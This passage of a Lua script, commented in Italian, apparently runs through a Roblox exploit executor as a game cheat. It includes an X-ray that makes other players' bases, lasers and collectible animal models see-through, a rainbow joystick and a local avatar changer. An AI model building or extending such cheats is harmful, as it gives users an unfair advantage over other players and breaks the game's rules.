                        for container in pairs(watchers) do unwatch(container) end
                    end
                end,
                isEnabled = function() return enabled end,
            }
        end

        _G.AmbitiousRainbowToolsEnabled     = false
        _G.AmbitiousTransparentToolsEnabled = false
        _G.AmbitiousCustomToolsEnabled      = false
        _G.AmbitiousCustomSoundsEnabled     = false
    end


    _G._AmbitiousXRayFolders = {
        "Base", "PlotSign", "FriendPanel", "Cash", "Laser",
        "Decorations", "Skin", "Unlock", "Purchases"
    }
    _G._AmbitiousXRayOrigTrans = {}  -- tabella forte: il GC non raccoglie le chiavi durante il restore
    _G._AmbitiousXRayConns = {}
    _G._AmbitiousXRayLoopId = 0

    do
    local function setXRayTargetTransparency(instance, alphaPercent, loopId)
        if not instance then return end
        if loopId and loopId ~= _G._AmbitiousXRayLoopId then return end
        local function apply(obj)
            if obj:IsA("BasePart") then
                if _G._AmbitiousXRayOrigTrans[obj] == nil then
                    _G._AmbitiousXRayOrigTrans[obj] = obj.Transparency
                end
                local orig = _G._AmbitiousXRayOrigTrans[obj]
                if orig < 1 then
                    local target = orig + (1 - orig) * alphaPercent
                    if math.abs(obj.Transparency - target) > 0.01 then
                        obj.Transparency = target
                    end
                end
            elseif obj:IsA("TextLabel") or obj:IsA("TextButton") then
                if _G._AmbitiousXRayOrigTrans[obj] == nil then
                    _G._AmbitiousXRayOrigTrans[obj] = { text = obj.TextTransparency, bg = obj.BackgroundTransparency }
                end
                local orig = _G._AmbitiousXRayOrigTrans[obj]
                if orig.text < 1 then
                    local target = orig.text + (1 - orig.text) * alphaPercent
                    if math.abs(obj.TextTransparency - target) > 0.01 then obj.TextTransparency = target end
                end
                if orig.bg < 1 then
                    local target = orig.bg + (1 - orig.bg) * alphaPercent
                    if math.abs(obj.BackgroundTransparency - target) > 0.01 then obj.BackgroundTransparency = target end
                end
            elseif obj:IsA("Frame") or obj:IsA("ScrollingFrame") then
                if _G._AmbitiousXRayOrigTrans[obj] == nil then
                    _G._AmbitiousXRayOrigTrans[obj] = obj.BackgroundTransparency
                end
                local orig = _G._AmbitiousXRayOrigTrans[obj]
                if orig < 1 then
                    local target = orig + (1 - orig) * alphaPercent
                    if math.abs(obj.BackgroundTransparency - target) > 0.01 then obj.BackgroundTransparency = target end
                end
            elseif obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
                if _G._AmbitiousXRayOrigTrans[obj] == nil then
                    _G._AmbitiousXRayOrigTrans[obj] = { img = obj.ImageTransparency, bg = obj.BackgroundTransparency }
                end
                local orig = _G._AmbitiousXRayOrigTrans[obj]
                if orig.img < 1 then
                    local target = orig.img + (1 - orig.img) * alphaPercent
                    if math.abs(obj.ImageTransparency - target) > 0.01 then obj.ImageTransparency = target end
                end
                if orig.bg < 1 then
                    local target = orig.bg + (1 - orig.bg) * alphaPercent
                    if math.abs(obj.BackgroundTransparency - target) > 0.01 then obj.BackgroundTransparency = target end
                end
            end
        end
        apply(instance)
        local descendants = instance:GetDescendants()
        for i, child in ipairs(descendants) do
            apply(child)
            if i % 300 == 0 then
                task.wait()
                if loopId and loopId ~= _G._AmbitiousXRayLoopId then return end
            end
        end
    end

    local function trackXRaySubtree(root, alphaPercent, loopId)
        if not root then return end
        if loopId ~= _G._AmbitiousXRayLoopId then return end
        setXRayTargetTransparency(root, alphaPercent, loopId)
        if loopId ~= _G._AmbitiousXRayLoopId then return end
        table.insert(_G._AmbitiousXRayConns, root.DescendantAdded:Connect(function(obj)
            if loopId ~= _G._AmbitiousXRayLoopId then return end
            setXRayTargetTransparency(obj, alphaPercent, loopId)
        end))
    end

    local function processPlotXRay(plot, alphaPercent, loopId)
        if not plot then return end
        if loopId ~= _G._AmbitiousXRayLoopId then return end
        for _, fname in ipairs(_G._AmbitiousXRayFolders) do
            if loopId ~= _G._AmbitiousXRayLoopId then return end
            trackXRaySubtree(plot:FindFirstChild(fname), alphaPercent, loopId)
        end
        if loopId ~= _G._AmbitiousXRayLoopId then return end
        table.insert(_G._AmbitiousXRayConns, plot.ChildAdded:Connect(function(child)
            if loopId ~= _G._AmbitiousXRayLoopId then return end
            for _, fname in ipairs(_G._AmbitiousXRayFolders) do
                if child.Name == fname then
                    trackXRaySubtree(child, alphaPercent, loopId)
                    break
                end
            end
        end))
        local animalPodiums = plot:FindFirstChild("AnimalPodiums")
        if animalPodiums then
            local function processPodium(podium)
                for _, child in ipairs(podium:GetChildren()) do
                    if child.Name == "Claim" then
                        trackXRaySubtree(child, alphaPercent, loopId)
                    elseif child.Name == "Base" then
                        trackXRaySubtree(child:FindFirstChild("Decorations"), alphaPercent, loopId)
                    elseif child:IsA("Model") and child.Name ~= "Decorations" then
                        trackXRaySubtree(child, alphaPercent, loopId)
                    end
                end
            end
            for _, podium in ipairs(animalPodiums:GetChildren()) do
                processPodium(podium)
            end
            table.insert(_G._AmbitiousXRayConns, animalPodiums.ChildAdded:Connect(function(podium)
                if loopId ~= _G._AmbitiousXRayLoopId then return end
                task.wait(0.1)
                if loopId ~= _G._AmbitiousXRayLoopId then return end
                processPodium(podium)
            end))
        end
    end

    local function applyTransparencyToAllPlotsXRay(alphaPercent, loopId)
        local plotsFolder = workspace:FindFirstChild("Plots")
        if not plotsFolder then return end
        for _, plot in ipairs(plotsFolder:GetChildren()) do
            if loopId ~= _G._AmbitiousXRayLoopId then return end
            processPlotXRay(plot, alphaPercent, loopId)
            task.wait()
        end
        table.insert(_G._AmbitiousXRayConns, plotsFolder.ChildAdded:Connect(function(plot)
            if loopId ~= _G._AmbitiousXRayLoopId then return end
            task.wait(0.2)
            processPlotXRay(plot, alphaPercent, loopId)
        end))
    end

    function setXRay(enabled)
        for _, conn in ipairs(_G._AmbitiousXRayConns) do
            if typeof(conn) == "RBXScriptConnection" then conn:Disconnect() end
        end
        _G._AmbitiousXRayConns = {}
        _G._AmbitiousXRayLoopId = _G._AmbitiousXRayLoopId + 1
        local currentLoopId = _G._AmbitiousXRayLoopId
        if enabled then
            local alphaPercent = 0.5
            task.spawn(function()
                while currentLoopId == _G._AmbitiousXRayLoopId and not workspace:FindFirstChild("Plots") do
                    task.wait(0.5)
                end
                if currentLoopId ~= _G._AmbitiousXRayLoopId then return end
                pcall(applyTransparencyToAllPlotsXRay, alphaPercent, currentLoopId)
            end)
        else
            local snapshot = _G._AmbitiousXRayOrigTrans
            _G._AmbitiousXRayOrigTrans = {}  -- tabella forte: il GC non raccoglie le chiavi durante il restore
            for obj, orig in pairs(snapshot) do
                pcall(function()
                    if obj:IsA("BasePart") then
                        obj.Transparency = orig
                    elseif obj:IsA("TextLabel") or obj:IsA("TextButton") then
                        obj.TextTransparency = orig.text
                        obj.BackgroundTransparency = orig.bg
                    elseif obj:IsA("Frame") or obj:IsA("ScrollingFrame") then
                        obj.BackgroundTransparency = orig
                    elseif obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
                        obj.ImageTransparency = orig.img
                        obj.BackgroundTransparency = orig.bg
                    end
                end)
            end
        end
    end
    end -- X-RAY do block

    -- >>> BRAINROT X-RAY BEGIN
    -- Rende trasparenti i brainrot (i Model il cui nome sta in Datas.Animals).
    --
    -- NOTA SUI LOCAL: il main chunk e' a ridosso del limite di 200 local, quindi
    -- qui NON se ne dichiara nemmeno uno: stato e funzioni stanno tutti dentro
    -- la tabella _G._AmbitiousBrainrotXRay. I local dentro le funzioni non
    -- contano, vivono nello scope della funzione.
    --
    -- Logica a eventi, come il No Animations dell'Anti Lag:
    --  * UNA sola scansione del Workspace, all'accensione, spezzata in blocchi
    --    per non far scattare il frame. Da li' in poi non si riscansiona piu'.
    --  * Il DescendantAdded lavora solo sull'istanza arrivata: se e' un Model
    --    animale applica a quello, se e' una parte risale al massimo 3 livelli.
    --  * Spegnendolo, ogni istanza toccata torna alla trasparenza ORIGINALE,
    --    con lo stesso snapshot che usa l'X-Ray normale.
    _G._AmbitiousBrainrotXRay = {
      enabled = false,
      trans   = 0.5,
      names   = nil,
      -- [istanza] = trasparenza originale.
      -- TABELLA FORTE, NON weak: con __mode="k" il GC puo' buttare via la voce
      -- anche se la parte e' ancora viva nel mondo (Lua non ha piu' un
      -- riferimento suo, ma l'istanza esiste lo stesso nel DataModel). Era per
      -- quello che alcuni brainrot restavano trasparenti allo spegnimento.
      -- Non cresce all'infinito: viene svuotata ad ogni spegnimento.
      saved   = {},
      conns   = {},
      scanId  = 0,
    }

    _G._AmbitiousBrainrotXRay.loadNames = function()
      local BRX = _G._AmbitiousBrainrotXRay
      if BRX.names then return BRX.names end
      local t = {}
      pcall(function()
        local datas = ReplicatedStorage:FindFirstChild("Datas")
        local m = datas and datas:FindFirstChild("Animals")
        if m and m:IsA("ModuleScript") then
          for k in pairs(require(m)) do t[k] = true end
        end
      end)
      BRX.names = t
      return t
    end

    _G._AmbitiousBrainrotXRay.isHitbox = function(o)
      local n = string.lower(o.Name)
      return (string.find(n, "hit") or string.find(n, "target") or string.find(n, "box")
           or string.find(n, "root") or string.find(n, "collect") or string.find(n, "prompt")) ~= nil
    end

    -- Applica a UNA istanza, salvando il valore originale la prima volta.
    _G._AmbitiousBrainrotXRay.applyOne = function(o)
      local BRX = _G._AmbitiousBrainrotXRay
      if not (o:IsA("BasePart") or o:IsA("Decal") or o:IsA("Texture")) then return end
      local orig = BRX.saved[o]
      if orig == nil then
        orig = o.Transparency
        -- Le hitbox gia' semi-trasparenti vanno trattate come invisibili,
        -- altrimenti spegnendo tornerebbero visibili a meta'.
        if orig > 0.5 and orig < 0.99 and o:IsA("BasePart") and BRX.isHitbox(o) then
          orig = 1
        end
        BRX.saved[o] = orig
      end
      -- Si tocca solo cio' che era davvero visibile.
      if orig < 0.5 and o.Transparency ~= BRX.trans then
        o.Transparency = BRX.trans
      end
    end

    _G._AmbitiousBrainrotXRay.applyModel = function(m)
      local BRX = _G._AmbitiousBrainrotXRay
      for _, o in ipairs(m:GetDescendants()) do
        BRX.applyOne(o)
      end
    end

    _G._AmbitiousBrainrotXRay.isAnimal = function(m)
      local BRX = _G._AmbitiousBrainrotXRay
      return m:IsA("Model") and BRX.names and BRX.names[m.Name] == true
    end

    -- Gate O(1): si risale di pochi livelli, non si cerca nulla.
    _G._AmbitiousBrainrotXRay.animalAncestor = function(inst)
      local BRX = _G._AmbitiousBrainrotXRay
      local p = inst.Parent
      -- 5 livelli invece di 3: mesh e accessori possono stare piu' in fondo,
      -- e se non li si riconosce restano opachi (e poi non si ripristinano).
      for _ = 1, 5 do
        if not p or p == workspace then return nil end
        if p:IsA("Model") and BRX.names and BRX.names[p.Name] then return p end
        p = p.Parent
      end
      return nil
    end

    _G._AmbitiousBrainrotXRay.restoreAll = function()
      local BRX = _G._AmbitiousBrainrotXRay
      -- Si stacca lo snapshot e si riparte da zero, cosi' la tabella non
      -- accumula istanze morte da una sessione all'altra.
      local snapshot = BRX.saved
      BRX.saved = {}
      for o, orig in pairs(snapshot) do
        pcall(function()
          if o and o.Parent then o.Transparency = orig end
        end)
      end
    end

    function _G.AmbitiousSetBrainrotXRay(on)
      local BRX = _G._AmbitiousBrainrotXRay
      on = on and true or false
      BRX.enabled = on
      _G.AmbitiousBrainrotXRayEnabled = on

      for _, c in ipairs(BRX.conns) do
        pcall(function() c:Disconnect() end)
      end
      BRX.conns = {}
      BRX.scanId = BRX.scanId + 1

      if not on then
        BRX.restoreAll()
        return
      end

      BRX.loadNames()

      -- Scansione iniziale, a blocchi di 500 istanze
      local myScan = BRX.scanId
      task.spawn(function()
        local n = 0
        for _, d in ipairs(workspace:GetDescendants()) do
          if BRX.scanId ~= myScan then return end
          if BRX.isAnimal(d) then BRX.applyModel(d) end
          n = n + 1
          if n % 500 == 0 then task.wait() end
        end
      end)

      -- Da qui in poi: solo l'istanza che arriva, niente rescan.
      table.insert(BRX.conns, workspace.DescendantAdded:Connect(function(inst)
        if not BRX.enabled then return end
        if inst:IsA("Model") then
          if BRX.names and BRX.names[inst.Name] then
            -- il model arriva vuoto: si aspetta un frame che si popoli
            task.defer(function()
              if BRX.enabled and inst.Parent then BRX.applyModel(inst) end
            end)
          end
          return
        end
        if inst:IsA("BasePart") or inst:IsA("Decal") or inst:IsA("Texture") then
          if BRX.animalAncestor(inst) then BRX.applyOne(inst) end
        end
      end))
    end
    -- <<< BRAINROT X-RAY END

    -- >>> RAINBOW MOBILE JOYSTICK BEGIN
    -- ============================================================
    -- RAINBOW MOBILE JOYSTICK
    -- Colora in arcobaleno il thumbstick e il tasto salto dei controlli touch.
    -- Il modulo sta FUORI da __AmbitiousDuelsSetupVisualsUI: quella funzione
    -- viene richiamata dal Reset All Settings, e definirlo li' dentro
    -- significherebbe registrare un secondo set di connessioni ad ogni reset.
    -- ============================================================
    _G.AmbitiousRainbowJoystickEnabled = _G.AmbitiousRainbowJoystickEnabled == true
    ;(function()
      local conns = {}
      local renderConn = nil
      -- [oggetto] = {prop = "ImageColor3" | "BackgroundColor3", orig = Color3}
      -- Il colore originale si tiene da parte alla prima volta che si incontra
      -- l'oggetto: spegnendo il toggle si rimette quello, invece di lasciare
      -- i controlli dell'ultima tinta dell'arcobaleno.
      local targets = {}

      local startRJ, stopRJ

      local function restoreAll()
        for obj, info in pairs(targets) do
          if obj and obj.Parent then
            pcall(function() obj[info.prop] = info.orig end)
          end
        end
        targets = {}
      end

      local function addTarget(obj)
        if targets[obj] then return end
        if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
          targets[obj] = {prop = "ImageColor3", orig = obj.ImageColor3}
        elseif obj:IsA("Frame") then
          targets[obj] = {prop = "BackgroundColor3", orig = obj.BackgroundColor3}
        end
      end

      local function rescan()
        local touchGui = PlayerGui:FindFirstChild("TouchGui")
        if not touchGui then return end

        for _, v in ipairs(touchGui:GetDescendants()) do
          if v:IsA("ImageLabel") or v:IsA("Frame") then
            local n = v.Name:lower()
            if n:find("thumbstick") or n:find("stick") then addTarget(v) end
          end
        end

        -- Tasto salto: il primo ImageButton dentro TouchControlFrame, con i
        -- suoi figli. Come nell'originale ci si ferma al primo.
        local tcf = touchGui:FindFirstChild("TouchControlFrame")
        if tcf then
          for _, v in ipairs(tcf:GetDescendants()) do
            if v:IsA("ImageButton") then
              addTarget(v)
              for _, d in ipairs(v:GetDescendants()) do
                if d:IsA("ImageLabel") then addTarget(d) end
              end
              break
            end
          end
        end
      end

      stopRJ = function()
        for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
        conns = {}
        if renderConn then
          pcall(function() renderConn:Disconnect() end)
          renderConn = nil
        end
        restoreAll()
      end

      startRJ = function()
        stopRJ()
        rescan()

        -- I controlli touch possono comparire dopo (Roblox li crea al primo
        -- tocco) o essere ricostruiti: si riaggancia invece di dare per
        -- scontato che TouchGui esista gia'. Niente WaitForChild con timeout,
        -- che bloccherebbe il toggle per dieci secondi su PC.
        table.insert(conns, PlayerGui.ChildAdded:Connect(function(ch)
          if ch.Name == "TouchGui" and _G.AmbitiousRainbowJoystickEnabled then
            task.wait(0.2)
            if _G.AmbitiousRainbowJoystickEnabled then startRJ() end
          end
        end))

        local touchGui = PlayerGui:FindFirstChild("TouchGui")
        if touchGui then
          table.insert(conns, touchGui.DescendantAdded:Connect(function()
            task.wait(0.2)
            if _G.AmbitiousRainbowJoystickEnabled then rescan() end
          end))
        end

        renderConn = RunService.RenderStepped:Connect(function()
          local t = tick() * 2
          local color = Color3.new(
            math.sin(t) * 0.5 + 0.5,
            math.sin(t + 2) * 0.5 + 0.5,
            math.sin(t + 4) * 0.5 + 0.5
          )
          for obj, info in pairs(targets) do
            if obj and obj.Parent then
              obj[info.prop] = color
            else
              -- oggetto distrutto: si toglie dalla lista invece di ritentare
              -- di colorarlo sessanta volte al secondo
              targets[obj] = nil
            end
          end
        end)
      end

      function _G.AmbitiousSetRainbowJoystick(on)
        on = on and true or false
        _G.AmbitiousRainbowJoystickEnabled = on
        if on then startRJ() else stopRJ() end
      end
    end)()

    -- Applica lo stato letto dal config (loadAmbitiousConfig gira prima di qui).
    if _G.AmbitiousRainbowJoystickEnabled then
      pcall(_G.AmbitiousSetRainbowJoystick, true)
    end
    -- <<< RAINBOW MOBILE JOYSTICK END

    -- ========================== AVATAR CHANGER ==========================
    do
        -- ---- Stato persistente ----
        _G._AmbitiousAvatarChanger = {
          Hair     = { enabled=false, savedId=nil, savedName="" },
          Hats     = { enabled=false, savedId=nil, savedName="" },
          Face     = { enabled=false, savedId=nil, savedName="" },
          Neck     = { enabled=false, savedId=nil, savedName="" },
          Shoulder = { enabled=false, savedId=nil, savedName="" },
          Front    = { enabled=false, savedId=nil, savedName="" },
          Back     = { enabled=false, savedId=nil, savedName="" },
          Waist    = { enabled=false, savedId=nil, savedName="" },
          Shirts   = { enabled=false, savedId=nil, savedName="" },
          Pants    = { enabled=false, savedId=nil, savedName="" },
          ["T-Shirts"] = { enabled=false, savedId=nil, savedName="" },
          Jackets  = { enabled=false, savedId=nil, savedName="" },
          Sweaters = { enabled=false, savedId=nil, savedName="" },
          Bottoms  = { enabled=false, savedId=nil, savedName="" },
        }
        -- Applica i dati caricati dal config se presenti.
        -- Questo blocco gira PRIMA di loadConfig(), quindi la funzione resta
        -- esposta: loadConfig la richiama appena ha letto il file.
        _G._AmbitiousAvatarChangerApplyPending = function()
          if type(_G._AmbitiousAvatarChangerPending) ~= "table" then return end
          for k,v in pairs(_G._AmbitiousAvatarChangerPending) do
            if _G._AmbitiousAvatarChanger[k] and type(v) == "table" then
              _G._AmbitiousAvatarChanger[k].enabled   = v.enabled == true
              _G._AmbitiousAvatarChanger[k].savedId   = tonumber(v.savedId)
              _G._AmbitiousAvatarChanger[k].savedName = tostring(v.savedName or "")
            end
          end
          _G._AmbitiousAvatarChangerPending = nil
        end
        -- Primo tentativo: serve se il config era gia' stato letto altrove.
        _G._AmbitiousAvatarChangerApplyPending()
        -- Fallback diretto dal file, per lo stesso motivo delle skin.
        if type(_G._AmbitiousAvatarChangerPending) ~= "table" then
          pcall(function()
            if isfile and isfile("VynxPC.json") and readfile then
              local okJson, decoded = pcall(function()
                return game:GetService("HttpService"):JSONDecode(readfile("VynxPC.json"))
              end)
              if okJson and type(decoded) == "table" and type(decoded.avatarChanger) == "table" then
                _G._AmbitiousAvatarChangerPending = decoded.avatarChanger
                _G._AmbitiousAvatarChangerApplyPending()
              end
            end
          end)
        end

        local AC_CATEGORIES = {
          { Name="Hair",     AssetTypes={Enum.AvatarAssetType.HairAccessory} },
          { Name="Hats",     AssetTypes={Enum.AvatarAssetType.Hat} },
          { Name="Face",     AssetTypes={Enum.AvatarAssetType.FaceAccessory} },
          { Name="Neck",     AssetTypes={Enum.AvatarAssetType.NeckAccessory} },
          { Name="Shoulder", AssetTypes={Enum.AvatarAssetType.ShoulderAccessory} },
          { Name="Front",    AssetTypes={Enum.AvatarAssetType.FrontAccessory} },
          { Name="Back",     AssetTypes={Enum.AvatarAssetType.BackAccessory} },
          { Name="Waist",    AssetTypes={Enum.AvatarAssetType.WaistAccessory} },
          { Name="Shirts",   AssetTypes={Enum.AvatarAssetType.Shirt} },
          { Name="Pants",    AssetTypes={Enum.AvatarAssetType.Pants} },
          { Name="T-Shirts", AssetTypes={Enum.AvatarAssetType.TShirt} },
          { Name="Jackets",  AssetTypes={Enum.AvatarAssetType.JacketAccessory} },
          { Name="Sweaters", AssetTypes={Enum.AvatarAssetType.SweaterAccessory} },
          { Name="Bottoms",  AssetTypes={Enum.AvatarAssetType.ShortsAccessory} },
        }

        -- ---- Equip ----
        -- Generazione: cresce ad ogni respawn. Serve ad abortire gli equip
        -- rimasti in sospeso su un character ormai vecchio.
        local _acGen = 0
        -- Cache dei template scaricati: il watcher puo' riapplicare un item
        -- molte volte, senza cache ogni volta sarebbe una richiesta di rete.
        local _acAssetCache = {}

        -- Usa l'helper condiviso definito in cima allo script
        local _acWaitCharReady = _G._AmbitiousWaitCharReady

        -- Ritorna true solo se l'item e' stato davvero applicato.
        local function _acEquipItem(itemId, itemType, itemName, gen)
          if not itemId then return false end
          if gen == nil then gen = _acGen end
          local ok, applied = pcall(function()
            local objects
            local cached = _acAssetCache[itemId]
            if cached then
              objects = { cached:Clone() }
            else
              objects = game:GetObjects("rbxassetid://"..tostring(itemId))
              if objects and objects[1] then
                _acAssetCache[itemId] = objects[1]:Clone()
              end
            end
            -- GetObjects fa una richiesta di rete: nel frattempo il character
            -- puo' essere cambiato, quindi si rilegge adesso e non prima.
            if gen ~= _acGen then return false end
            local character = LP.Character
            if not character or not character.Parent then return false end
            if not _acWaitCharReady(character, 5) then return false end
            if gen ~= _acGen then return false end
            if not objects or #objects==0 then return false end
              local item = objects[1]
              if item:IsA("Folder") or item:IsA("Model") then
                local core = item:FindFirstChildOfClass("Accessory")
                  or item:FindFirstChildOfClass("Shirt")
                  or item:FindFirstChildOfClass("Pants")
                  or item:FindFirstChildOfClass("ShirtGraphic")
                if core then item=core end
              end
              if item:IsA("Shirt") then
                for _,c in pairs(character:GetChildren()) do if c:IsA("Shirt") then c:Destroy() end end
                item.Name="ACShirt"; item.Parent=character; return true
              elseif item:IsA("Pants") then
                for _,c in pairs(character:GetChildren()) do if c:IsA("Pants") then c:Destroy() end end
                item.Name="ACPants"; item.Parent=character; return true
              elseif item:IsA("ShirtGraphic") then
                for _,c in pairs(character:GetChildren()) do if c:IsA("ShirtGraphic") then c:Destroy() end end
                item.Name="ACTShirt"; item.Parent=character; return true
              end
              if item:IsA("Accessory") then
                local handle=item:FindFirstChild("Handle")
                if handle then
                  if itemType==Enum.AvatarAssetType.HairAccessory then
                    for _,c in pairs(character:GetChildren()) do
                      if c:IsA("Accessory") and (c.Name:lower():find("hair") or (c:FindFirstChild("Handle") and c.Handle:FindFirstChild("HairAttachment"))) then c:Destroy() end
                    end
                  else
                    for _,c in pairs(character:GetChildren()) do
                      if c:IsA("Accessory") and (c.Name==itemName or c.Name=="AC"..itemName) then c:Destroy() end
                    end
                  end
                  local attachment=handle:FindFirstChildOfClass("Attachment")
                  local targetPart=character:FindFirstChild("Head")
                  local targetAttachment=nil
                  if attachment then
                    for _,bodyPart in pairs(character:GetChildren()) do
                      if bodyPart:IsA("BasePart") then
                        targetAttachment=bodyPart:FindFirstChild(attachment.Name)
                        if targetAttachment then targetPart=bodyPart; break end
                      end
                    end
                  end
                  -- Senza un punto di aggancio valido il weld esplode: meglio
                  -- fallire pulito e lasciare che il retry ci riprovi.
                  if not targetPart then
                    targetPart = character:FindFirstChild("HumanoidRootPart")
                  end
                  if not targetPart then return false end
                  item.Name="AC"..itemName; item.Parent=character
                  handle.CFrame=targetPart.CFrame
                  for _,j in pairs(handle:GetChildren()) do
                    if j:IsA("Weld") or j:IsA("ManualWeld") or j:IsA("WeldConstraint") then j:Destroy() end
                  end
                  local w=Instance.new("Weld")
                  w.Name="ACManualWeld"; w.Part0=handle; w.Part1=targetPart
                  if attachment and targetAttachment then w.C0=attachment.CFrame; w.C1=targetAttachment.CFrame
                  else w.C0=CFrame.new(0,0.5,0) end
                  w.Parent=handle
                  return true
                end
              end
              return false
          end)
          return ok and applied == true
        end

        -- ---- Rimuovi item dal character ----
        local function _acRemoveItem(itemType, itemName)
          local character = LP.Character
          if not character then return end
          pcall(function()
            if itemType == Enum.AvatarAssetType.Shirt then
              for _,c in pairs(character:GetChildren()) do
                if c:IsA("Shirt") and (c.Name=="ACShirt" or c.Name==itemName) then c:Destroy() end
              end
            elseif itemType == Enum.AvatarAssetType.Pants then
              for _,c in pairs(character:GetChildren()) do
                if c:IsA("Pants") and (c.Name=="ACPants" or c.Name==itemName) then c:Destroy() end
              end
            elseif itemType == Enum.AvatarAssetType.TShirt then
              for _,c in pairs(character:GetChildren()) do
                if c:IsA("ShirtGraphic") and (c.Name=="ACTShirt" or c.Name==itemName) then c:Destroy() end
              end
            else
              -- Accessory: rimuovi per nome salvato
              for _,c in pairs(character:GetChildren()) do
                if c:IsA("Accessory") and (c.Name=="AC"..itemName or c.Name==itemName) then c:Destroy() end
              end
            end
          end)
        end

        -- ---- Save/Load separato ----
        local function _acSaveConfig()
          pcall(saveAmbitiousConfig)
        end

        -- (load avviene in loadAmbitiousConfig, già eseguita prima di questo blocco)

        -- Applica tutti gli item con toggle ON
        local function _acApplyAll(gen)
          if gen == nil then gen = _acGen end
          -- Si aspetta che il character sia completo PRIMA di iniziare:
          -- l'attesa a tempo fisso era la causa degli item saltati al reset.
          local character = LP.Character
          if not character then return end
          if not _acWaitCharReady(character, 10) then return end
          if gen ~= _acGen then return end

          for _,cat in ipairs(AC_CATEGORIES) do
            if gen ~= _acGen then return end   -- respawn nel frattempo: si abortisce
            local entry=_G._AmbitiousAvatarChanger[cat.Name]
            if entry and entry.enabled and entry.savedId then
              -- Fino a 3 tentativi: se l'asset tarda o il weld non trova
              -- l'attachment, si riprova invece di perdere l'item.
              for attempt = 1, 3 do
                if gen ~= _acGen then return end
                if _acEquipItem(entry.savedId, cat.AssetTypes[1], entry.savedName, gen) then
                  break
                end
                task.wait(0.25 * attempt)
              end
              task.wait(0.05)
            end
          end
        end

        -- Applica subito al personaggio esistente se c'e' un char e toggle ON
        task.spawn(function()
          if not LP.Character then return end
          _acApplyAll(_acGen)
        end)

        -- Applica al respawn
        LP.CharacterAdded:Connect(function()
          _acGen = _acGen + 1          -- invalida gli equip del character precedente
          local gen = _acGen
          task.spawn(function()
            _acApplyAll(gen)
          end)
        end)

        -- ------------------------------------------------------------
        -- WATCHER RE-EQUIP
        -- Gli item dell'Avatar Changer sono locali: quando un altro giocatore
        -- ti colpisce (o il gioco risincronizza il character) il server li
        -- cancella e restavi senza capelli. Qui vengono rimessi subito,
        -- sia per evento (ChildRemoved / HealthChanged) sia con un poll di
        -- sicurezza ogni secondo.
        -- ------------------------------------------------------------
        ;(function()
          local lastTry   = {}
          local fails     = {}
          local charConns = {}
          local pendingCheck = false

          -- Gli eventi (HealthChanged soprattutto) possono arrivare a raffica:
          -- qui vengono compattati in un solo controllo.
          local runCheck
          local function requestCheck(delaySec)
            if pendingCheck then return end
            pendingCheck = true
            task.delay(delaySec or 0.1, function()
              pendingCheck = false
              pcall(runCheck)
            end)
          end

          local function expectedFor(cat, entry)
            local at = cat.AssetTypes[1]
            if at == Enum.AvatarAssetType.Shirt then
              return "ACShirt", "Shirt"
            elseif at == Enum.AvatarAssetType.Pants then
              return "ACPants", "Pants"
            elseif at == Enum.AvatarAssetType.TShirt then
              return "ACTShirt", "ShirtGraphic"
            end
            return "AC"..tostring(entry.savedName or ""), "Accessory"
          end

          local function isPresent(character, cat, entry)
            local nm, cls = expectedFor(cat, entry)
            for _, c in ipairs(character:GetChildren()) do
              if c:IsA(cls) and (c.Name == nm or c.Name == entry.savedName) then
                return true
              end
            end
            return false
          end

          function runCheck()
            local character = LP.Character
            if not character or not character.Parent then return end
            local hum = character:FindFirstChildOfClass("Humanoid")
            if hum and hum.Health <= 0 then return end
            local now = tick()
            for _, cat in ipairs(AC_CATEGORIES) do
              local entry = _G._AmbitiousAvatarChanger[cat.Name]
              if entry and entry.enabled and entry.savedId then
                if isPresent(character, cat, entry) then
                  fails[cat.Name] = nil
                else
                  -- Backoff: se un asset non si applica (id rotto, attachment
                  -- assente) non si riprova all'infinito ogni 0.6s.
                  local n = fails[cat.Name] or 0
                  local wait = math.min(0.6 * (2 ^ math.min(n, 5)), 20)
                  if (now - (lastTry[cat.Name] or 0)) > wait then
                    lastTry[cat.Name] = now
                    local gen = _acGen
                    local _cn = cat.Name
                    local _id, _at, _nm = entry.savedId, cat.AssetTypes[1], entry.savedName
                    task.spawn(function()
                      if gen ~= _acGen then return end
                      if _acEquipItem(_id, _at, _nm, gen) then
                        fails[_cn] = nil
                      else
                        fails[_cn] = (fails[_cn] or 0) + 1
                      end
                    end)
                  end
                end
              end
            end
          end
          _G._AmbitiousAvatarChangerRecheck = function() fails = {}; pcall(runCheck) end

          local function hookCharacter(character)
            for _, c in ipairs(charConns) do pcall(function() c:Disconnect() end) end
            charConns = {}
            if not character then return end
            table.insert(charConns, character.ChildRemoved:Connect(function(child)
              if child:IsA("Accessory") or child:IsA("Shirt")
              or child:IsA("Pants") or child:IsA("ShirtGraphic") then
                requestCheck(0.05)
              end
            end))
            local hum = character:FindFirstChildOfClass("Humanoid")
            if hum then
              -- Il caso segnalato: colpito da un altro player -> accessori persi
              table.insert(charConns, hum.HealthChanged:Connect(function()
                requestCheck(0.15)
              end))
            end
          end

          hookCharacter(LP.Character)
          LP.CharacterAdded:Connect(function(c)
            task.delay(0.6, function() hookCharacter(c) end)
          end)

          task.spawn(function()
            while true do
              task.wait(1)
              pcall(runCheck)
            end
          end)
        end)()

        -- ---- Visual callbacks sub-toggle ----
        local _acSubSetVisuals = {}

        -- ---- Unico popup condiviso ----
        local _acPickerGui = nil
        -- Categoria del popup attualmente aperto: serve per il toggle sul riclick
        local _acPickerCat = nil
        -- Il backdrop e' un Frame e non assorbe il click, quindi cliccando un PICK
        -- mentre il popup e' aperto arrivano DUE eventi in quest'ordine:
        --   1) backdrop.InputBegan -> chiude il popup
        --   2) pickBtn.Activated   -> lo trovava gia' chiuso e lo riapriva
        -- Ricordiamo cosa e' stato appena chiuso per ignorare il secondo evento.
        local _acPickerJustClosedCat = nil
        local _acPickerJustClosedAt = 0

        local function _acClosePicker()
          if _acPickerGui and _acPickerGui.Parent then
            _acPickerGui:Destroy()
            _acPickerJustClosedCat = _acPickerCat
            _acPickerJustClosedAt = tick()
          end
          _acPickerGui = nil
          _acPickerCat = nil
        end

        local function _acOpenPicker(catName, assetTypes)
          -- Riclick sullo stesso PICK: chiude, come fanno gli altri picker.
          -- Click su un PICK diverso: passa a quella categoria.
          if _acPickerGui and _acPickerGui.Parent and _acPickerCat == catName then
            _acClosePicker()
            return
          end
          -- Il backdrop ha appena chiuso questo stesso popup: non riaprirlo.
